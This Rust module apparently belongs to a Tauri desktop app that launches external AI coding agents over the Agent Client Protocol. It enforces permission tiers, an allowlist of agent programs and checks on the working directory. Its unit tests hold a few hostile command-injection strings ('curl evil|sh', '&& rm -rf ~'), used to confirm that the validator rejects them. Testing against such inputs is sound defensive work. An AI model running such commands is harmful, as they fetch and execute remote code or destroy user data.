//! ACP 主机：spawn 外部 agent（stdio JSON-RPC）、会话生命周期、Tauri 命令桥。
//!
//! 传输由 agent-client-protocol 2.0.0 crate 托管（AcpAgent 进程组守卫负责回收），
//! 本模块只持有连接句柄与生命周期。安全模型（宿主强制，前端档位仅作选择入口）：
//! - 权限档位在 `acp_start` 传入并在宿主执行：
//!   `cautious` → 全部转发前端逐条确认；`daily` → 仅只读类工具
//!   （read / search / fetch / think）自动放行，其余转发前端；`auto` → 直通首个
//!   Allow 选项。未知档位按 `cautious` 处理（fail-closed）。
//! - agent 启动命令经白名单校验：拒绝 shell 元字符；程序名必须在已知列表内。
//! - 会话 cwd 必须是已存在的绝对路径目录，且不得为文件系统根。

use crate::process_guard;
use std::collections::HashMap;
use std::path::PathBuf;
use std::str::FromStr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use agent_client_protocol::schema::v1::{
    ContentBlock, InitializeRequest, NewSessionRequest, PermissionOption, PermissionOptionId,
    PermissionOptionKind, PromptRequest, RequestPermissionOutcome, RequestPermissionRequest,
    RequestPermissionResponse, SelectedPermissionOutcome, SessionConfigOptionValue, SessionId,
    SessionNotification, SetSessionConfigOptionRequest, TextContent, ToolKind,
};
use agent_client_protocol::schema::ProtocolVersion;
use agent_client_protocol::{
    AcpAgent, Agent as AgentRole, Client, ConnectionTo, Error as AcpError,
};
use serde::Serialize;
use tauri::{AppHandle, Emitter, Manager, State};
use tokio::sync::oneshot;
use tokio::sync::Mutex;

/// 转发前端后的确认等待上限；超时按取消处理，避免挂死 agent 回合。
const PERMISSION_CONFIRM_TIMEOUT: Duration = Duration::from_secs(120);

/// 已知 ACP agent 入口程序（basename）。通用运行时（node/npx/bun/…）允许，
/// 因为部分 agent 以 npx 包形式分发（如 zed 桥接）。
const ALLOWED_AGENT_PROGRAMS: &[&str] = &[
    "opencode",
    "codex",
    "claude",
    "gemini",
    "crush",
    "qwen",
    "droid",
    "amp",
    "cursor-agent",
    "aider",
    "node",
    "npx",
    "bun",
    "bunx",
    "deno",
    "python3",
    "uvx",
];

/// 权限档位（与前端 settings store 的 PermTier 一一对应）。
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
enum PermissionTier {
    #[default]
    Cautious,
    Daily,
    Auto,
}

impl PermissionTier {
    /// 未知 / 缺失值 fail-closed 归入 Cautious。
    fn parse(raw: Option<&str>) -> Self {
        match raw.map(str::trim) {
            Some("auto") => PermissionTier::Auto,
            Some("daily") => PermissionTier::Daily,
            _ => PermissionTier::Cautious,
        }
    }
}

/// daily 档可自动放行的工具类别（只读语义）。
fn is_readonly_kind(kind: Option<ToolKind>) -> bool {
    matches!(
        kind,
        Some(ToolKind::Read)
            | Some(ToolKind::Search)
            | Some(ToolKind::Fetch)
            | Some(ToolKind::Think)
    )
}

fn allow_option(options: &[PermissionOption]) -> Option<&PermissionOption> {
    options.iter().find(|option| {
        matches!(
            option.kind,
            PermissionOptionKind::AllowOnce | PermissionOptionKind::AllowAlways
        )
    })
}

fn kind_label(kind: Option<ToolKind>) -> &'static str {
    match kind {
        Some(ToolKind::Read) => "read",
        Some(ToolKind::Edit) => "edit",
        Some(ToolKind::Delete) => "delete",
        Some(ToolKind::Move) => "move",
        Some(ToolKind::Search) => "search",
        Some(ToolKind::Execute) => "execute",
        Some(ToolKind::Think) => "think",
        Some(ToolKind::Fetch) => "fetch",
        Some(ToolKind::SwitchMode) => "switch_mode",
        _ => "other",
    }
}

fn option_kind_label(kind: PermissionOptionKind) -> &'static str {
    match kind {
        PermissionOptionKind::AllowOnce => "allow_once",
        PermissionOptionKind::AllowAlways => "allow_always",
        PermissionOptionKind::RejectOnce => "reject_once",
        PermissionOptionKind::RejectAlways => "reject_always",
        _ => "other",
    }
}

/// cwd 校验：绝对路径、已存在的目录、非文件系统根（"/"、"C:\" 等）。
fn validate_cwd(raw: &str) -> Result<PathBuf, String> {
    let trimmed = raw.trim();
    let path = PathBuf::from(trimmed);
    if trimmed.is_empty() || !path.is_absolute() {
        return Err(format!("cwd must be an absolute path, got: {raw:?}"));
    }
    // 拒绝文件系统根："/"、"C:/"、"C:\"
    let normalized = trimmed.replace('\\', "/");
    if normalized == "/"
        || (normalized.len() == 3 && normalized.as_bytes()[1] == b':' && normalized.ends_with('/'))
    {
        return Err("cwd must not be a filesystem root".to_string());
    }
    if !path.is_dir() {
        return Err(format!(
            "cwd does not exist or is not a directory: {}",
            path.display()
        ));
    }
    Ok(path)
}

/// 前端对一条权限请求的裁决。
enum PermissionDecision {
    Select(PermissionOptionId),
    Cancel,
}

/// 事件信封：统一 kind + payload，前端按 kind 分流渲染。
#[derive(Serialize, Clone)]
struct AcpEventEnvelope {
    kind: &'static str,
    payload: serde_json::Value,
}

struct AcpSession {
    command: String,
    conn: ConnectionTo<AgentRole>,
    task: tauri::async_runtime::JoinHandle<()>,
    session_id: Option<SessionId>,
}

/// 全局主机状态（tauri manage）。tier 为全局档位：单用户桌面应用同一时刻
/// 只有一个生效策略，多会话共享是当前约束下的有意简化。
#[derive(Default)]
pub struct AcpHost {
    next_id: AtomicU64,
    next_permission_id: AtomicU64,
    tier: Mutex<PermissionTier>,
    sessions: Mutex<HashMap<u64, AcpSession>>,
    pending_permissions: Mutex<HashMap<u64, oneshot::Sender<PermissionDecision>>>,
}

fn emit(app: &AppHandle, kind: &'static str, payload: serde_json::Value) {
    let _ = app.emit("acp://event", AcpEventEnvelope { kind, payload });
}

/// 组装给前端的权限请求载荷；auto=true 表示宿主已代为决策（仅通知流）。
fn permission_payload(
    request_id: u64,
    auto: bool,
    chosen: Option<&str>,
    request: &RequestPermissionRequest,
) -> serde_json::Value {
    serde_json::json!({
        "requestId": request_id,
        "auto": auto,
        "chosen": chosen,
        "toolCallId": request.tool_call.tool_call_id.to_string(),
        "title": request.tool_call.fields.title,
        "kind": kind_label(request.tool_call.fields.kind),
        "options": request.options.iter().map(|option| serde_json::json!({
            "optionId": option.option_id.to_string(),
            "name": option.name,
            "kind": option_kind_label(option.kind),
        })).collect::<Vec<_>>(),
    })
}

/// 启动外部 ACP agent 子进程并完成 initialize 握手，返回主机句柄 id。
///
/// `tier` 取前端权限档位（"cautious" | "daily" | "auto"），缺省/未知按 cautious。
#[tauri::command]
pub async fn acp_start(
    app: AppHandle,
    state: State<'_, AcpHost>,
    agent_cmd: String,
    tier: Option<String>,
) -> Result<u64, String> {
    let command = process_guard::validate_spawn_command(&agent_cmd, ALLOWED_AGENT_PROGRAMS)?;
    *state.tier.lock().await = PermissionTier::parse(tier.as_deref());

    let handle_id = state.next_id.fetch_add(1, Ordering::SeqCst);
    let agent =
        AcpAgent::from_str(&command).map_err(|error| format!("invalid agent command: {error}"))?;

    let (ready_tx, mut ready_rx) = tokio::sync::mpsc::channel::<ConnectionTo<AgentRole>>(1);
    let app_task = app.clone();

    let task = tauri::async_runtime::spawn(async move {
        let _ = Client
            .builder()
            .on_receive_notification(
                {
                    let app = app_task.clone();
                    async move |notification: SessionNotification,
                                _conn: ConnectionTo<AgentRole>| {
                        let payload =
                            serde_json::to_value(&notification).unwrap_or(serde_json::Value::Null);
                        emit(&app, "session-update", payload);
                        Ok::<(), AcpError>(())
                    }
                },
                agent_client_protocol::on_receive_notification!(),
            )
            .on_receive_request(
                {
                    let app = app_task.clone();
                    async move |request: RequestPermissionRequest,
                                responder,
                                _conn: ConnectionTo<AgentRole>| {
                        let response = resolve_permission(&app, request).await;
                        responder.respond(response)
                    }
                },
                agent_client_protocol::on_receive_request!(),
            )
            .connect_with(agent, |conn: ConnectionTo<AgentRole>| async move {
                let _ = ready_tx.send(conn).await;
                // 保持连接事件循环存活直至 acp_stop abort；闭包契约要求返回 Result
                let never: Result<(), AcpError> = std::future::pending().await;
                never
            })
            .await;
    });

    let conn = tokio::time::timeout(Duration::from_secs(10), ready_rx.recv())
        .await
        .map_err(|_| "agent handshake timeout (10s)".to_string())?
        .ok_or_else(|| "agent connection closed before ready".to_string())?;

    conn.clone()
        .send_request(InitializeRequest::new(ProtocolVersion::V1))
        .block_task()
        .await
        .map_err(|error| format!("initialize failed: {error}"))?;

    state.sessions.lock().await.insert(
        handle_id,
        AcpSession {
            command,
            conn,
            task,
            session_id: None,
        },
    );
    emit(&app, "started", serde_json::json!({ "handle": handle_id }));
    Ok(handle_id)
}

/// 宿主侧权限档位执行：能自动决策的直接响应；否则转发前端等待裁决。
async fn resolve_permission(
    app: &AppHandle,
    request: RequestPermissionRequest,
) -> RequestPermissionResponse {
    let tier = {
        let host = app.state::<AcpHost>();
        let guard = host.tier.lock().await;
        *guard
    };

    // auto 直通；daily 仅只读类工具直通。两者都要求存在 Allow 选项。
    let auto_allow = match tier {
        PermissionTier::Auto => true,
        PermissionTier::Daily => is_readonly_kind(request.tool_call.fields.kind),
        PermissionTier::Cautious => false,
    };
    if auto_allow {
        if let Some(option) = allow_option(&request.options) {
            let payload = permission_payload(
                u64::MAX,
                true,
                Some(option.option_id.to_string().as_str()),
                &request,
            );
            emit(app, "permission-auto", payload);
            return RequestPermissionResponse::new(RequestPermissionOutcome::Selected(
                SelectedPermissionOutcome::new(option.option_id.clone()),
            ));
        }
        // 没有 Allow 选项可选：直接取消而不是转发（cautious 才逐条问）。
        if tier == PermissionTier::Auto {
            return RequestPermissionResponse::new(RequestPermissionOutcome::Cancelled);
        }
    }

    // 转发前端：登记 pending 后立即释放锁，再等待裁决（或超时=取消）。
    let rx = {
        let host = app.state::<AcpHost>();
        let request_id = host.next_permission_id.fetch_add(1, Ordering::SeqCst);
        let (tx, rx) = oneshot::channel::<PermissionDecision>();
        host.pending_permissions.lock().await.insert(request_id, tx);
        emit(
            app,
            "permission-request",
            permission_payload(request_id, false, None, &request),
        );
        rx
    };

    match tokio::time::timeout(PERMISSION_CONFIRM_TIMEOUT, rx).await {
        Ok(Ok(PermissionDecision::Select(option_id))) => RequestPermissionResponse::new(
            RequestPermissionOutcome::Selected(SelectedPermissionOutcome::new(option_id)),
        ),
        _ => RequestPermissionResponse::new(RequestPermissionOutcome::Cancelled),
    }
}

/// 前端裁决回传：requestId 对应待决请求；optionId 为空表示拒绝。
#[tauri::command]
pub async fn acp_permission_respond(
    state: State<'_, AcpHost>,
    request_id: u64,
    option_id: Option<String>,
) -> Result<(), String> {
    let sender = state
        .pending_permissions
        .lock()
        .await
        .remove(&request_id)
        .ok_or_else(|| format!("unknown permission request {request_id}"))?;
    let decision = match option_id {
        Some(id) => PermissionDecision::Select(PermissionOptionId::from(id)),
        None => PermissionDecision::Cancel,
    };
    let _ = sender.send(decision);
    Ok(())
}

/// 在已启动的 agent 上创建 ACP 会话（session/new）。cwd 由宿主校验。
/// 返回 `{ sessionId, configOptions }`；configOptions 为 agent 暴露的会话级
/// 选择器（模型 / 推理力度 / 模式等），不支持时为空数组。
#[tauri::command]
pub async fn acp_new_session(
    app: AppHandle,
    state: State<'_, AcpHost>,
    handle: u64,
    cwd: String,
) -> Result<serde_json::Value, String> {
    let cwd = validate_cwd(&cwd)?;
    let mut sessions = state.sessions.lock().await;
    let session = sessions
        .get_mut(&handle)
        .ok_or_else(|| format!("unknown handle {handle}"))?;
    let response = session
        .conn
        .clone()
        .send_request(NewSessionRequest::new(cwd))
        .block_task()
        .await
        .map_err(|error| format!("session/new failed: {error}"))?;
    let session_id = response.session_id.clone();
    let id_str = session_id.to_string();
    let config_options = serde_json::to_value(response.config_options.clone().unwrap_or_default())
        .unwrap_or_else(|_| serde_json::Value::Array(Vec::new()));
    session.session_id = Some(session_id);
    emit(
        &app,
        "session-new",
        serde_json::json!({ "handle": handle, "sessionId": id_str }),
    );
    Ok(serde_json::json!({
        "sessionId": id_str,
        "configOptions": config_options,
    }))
}

/// 设置会话配置选项（session/set_config_option）：模型 / 推理力度 / 会话模式等。
/// select 选项传字符串值，boolean 选项传布尔值；返回全量最新配置选项。
#[tauri::command]
pub async fn acp_set_config(
    state: State<'_, AcpHost>,
    handle: u64,
    config_id: String,
    value: serde_json::Value,
) -> Result<serde_json::Value, String> {
    let option_value = match value {
        serde_json::Value::String(raw) => SessionConfigOptionValue::value_id(raw),
        serde_json::Value::Bool(flag) => SessionConfigOptionValue::boolean(flag),
        other => {
            return Err(format!(
                "unsupported config value {other}; expected string or bool"
            ))
        }
    };
    let mut sessions = state.sessions.lock().await;
    let session = sessions
        .get_mut(&handle)
        .ok_or_else(|| format!("unknown handle {handle}"))?;
    let session_id = session
        .session_id
        .clone()
        .ok_or_else(|| "session not created; call acp_new_session first".to_string())?;

    let response = session
        .conn
        .clone()
        .send_request(SetSessionConfigOptionRequest::new(
            session_id,
            config_id,
            option_value,
        ))
        .block_task()
        .await
        .map_err(|error| format!("session/set_config_option failed: {error}"))?;

    Ok(serde_json::to_value(&response).unwrap_or(serde_json::Value::Null))
}

/// 发送一轮 prompt；流式增量经 acp://event 通知，返回最终 PromptResponse。
#[tauri::command]
pub async fn acp_send(
    app: AppHandle,
    state: State<'_, AcpHost>,
    handle: u64,
    text: String,
) -> Result<serde_json::Value, String> {
    let mut sessions = state.sessions.lock().await;
    let session = sessions
        .get_mut(&handle)
        .ok_or_else(|| format!("unknown handle {handle}"))?;
    let session_id = session
        .session_id
        .clone()
        .ok_or_else(|| "session not created; call acp_new_session first".to_string())?;

    let response = session
        .conn
        .clone()
        .send_request(PromptRequest::new(
            session_id,
            vec![ContentBlock::Text(TextContent::new(text))],
        ))
        .block_task()
        .await
        .map_err(|error| format!("session/prompt failed: {error}"))?;

    let payload = serde_json::to_value(&response).unwrap_or(serde_json::Value::Null);
    emit(&app, "prompt-done", payload.clone());
    Ok(payload)
}

/// 停止会话：abort 事件循环任务，连接句柄 drop 后由 crate 进程组守卫回收子进程。
#[tauri::command]
pub async fn acp_stop(
    app: AppHandle,
    state: State<'_, AcpHost>,
    handle: u64,
) -> Result<(), String> {
    let removed = state.sessions.lock().await.remove(&handle);
    match removed {
        Some(session) => {
            session.task.abort();
            drop(session);
            emit(&app, "stopped", serde_json::json!({ "handle": handle }));
            Ok(())
        }
        None => Err(format!("unknown handle {handle}")),
    }
}

/// 当前存活句柄清单（诊断用）。
#[tauri::command]
pub async fn acp_list(state: State<'_, AcpHost>) -> Result<Vec<serde_json::Value>, String> {
    let sessions = state.sessions.lock().await;
    Ok(sessions
        .iter()
        .map(|(id, session)| {
            serde_json::json!({
                "handle": id,
                "command": session.command,
                "hasSession": session.session_id.is_some(),
            })
        })
        .collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    use agent_client_protocol::schema::v1::{
        PermissionOption, ToolCallUpdate, ToolCallUpdateFields,
    };

    #[test]
    fn agent_command_allows_known_programs_and_rejects_injection() {
        assert_eq!(
            process_guard::validate_spawn_command("opencode acp", ALLOWED_AGENT_PROGRAMS).unwrap(),
            "opencode acp"
        );
        assert!(process_guard::validate_spawn_command(
            "npx -y @zed-industries/claude-code-acp",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_ok());
        // shell 元字符 / 链式命令
        assert!(process_guard::validate_spawn_command(
            "opencode acp && rm -rf ~",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_err());
        assert!(
            process_guard::validate_spawn_command("curl evil|sh", ALLOWED_AGENT_PROGRAMS).is_err()
        );
        assert!(process_guard::validate_spawn_command(
            "opencode acp; curl evil",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_err());
        // 相对路径与未知程序
        assert!(
            process_guard::validate_spawn_command("./evil --serve", ALLOWED_AGENT_PROGRAMS)
                .is_err()
        );
        assert!(process_guard::validate_spawn_command(
            "malicious-agent acp",
            ALLOWED_AGENT_PROGRAMS
        )
        .is_err());
        assert!(process_guard::validate_spawn_command("   ", ALLOWED_AGENT_PROGRAMS).is_err());
    }

    #[test]
    fn cwd_rejects_roots_relative_and_missing() {
        assert!(validate_cwd("/").is_err());
        assert!(validate_cwd("C:/").is_err());
        assert!(validate_cwd("relative/path").is_err());
        assert!(validate_cwd("/nonexistent/greywork-cwd-probe").is_err());
        let tmp = std::env::temp_dir();
        assert_eq!(validate_cwd(&tmp.to_string_lossy()).unwrap(), tmp);
    }

    #[test]
    fn tier_parse_fails_closed_on_unknown() {
        assert_eq!(PermissionTier::parse(Some("auto")), PermissionTier::Auto);
        assert_eq!(PermissionTier::parse(Some("daily")), PermissionTier::Daily);
        assert_eq!(
            PermissionTier::parse(Some("cautious")),
            PermissionTier::Cautious
        );
        assert_eq!(
            PermissionTier::parse(Some("yolo")),
            PermissionTier::Cautious
        );
        assert_eq!(PermissionTier::parse(None), PermissionTier::Cautious);
        // 缺省实现同样是 Cautious（acp_start 未传档位时）
        assert_eq!(PermissionTier::default(), PermissionTier::Cautious);
    }

    fn permission_request(kind: Option<ToolKind>, allow: bool) -> RequestPermissionRequest {
        let option = PermissionOption::new(
            "opt-1",
            if allow { "Allow" } else { "Reject" },
            if allow {
                PermissionOptionKind::AllowOnce
            } else {
                PermissionOptionKind::RejectOnce
            },
        );
        RequestPermissionRequest::new(
            SessionId::new("sess-1"),
            ToolCallUpdate::new("call-1", ToolCallUpdateFields::default().kind(kind)),
            vec![option],
        )
    }

    #[test]
    fn daily_auto_allow_only_readonly_kinds_with_allow_option() {
        assert!(is_readonly_kind(Some(ToolKind::Read)));
        assert!(!is_readonly_kind(Some(ToolKind::Execute)));
        assert!(!is_readonly_kind(None));

        let readable = permission_request(Some(ToolKind::Read), true);
        assert!(allow_option(&readable.options).is_some());

        let executable = permission_request(Some(ToolKind::Execute), true);
        // Execute 即使有 Allow 选项也不满足 daily 直通条件
        assert!(!is_readonly_kind(executable.tool_call.fields.kind));

        let reject_only = permission_request(Some(ToolKind::Read), false);
        assert!(allow_option(&reject_only.options).is_none());
    }
}
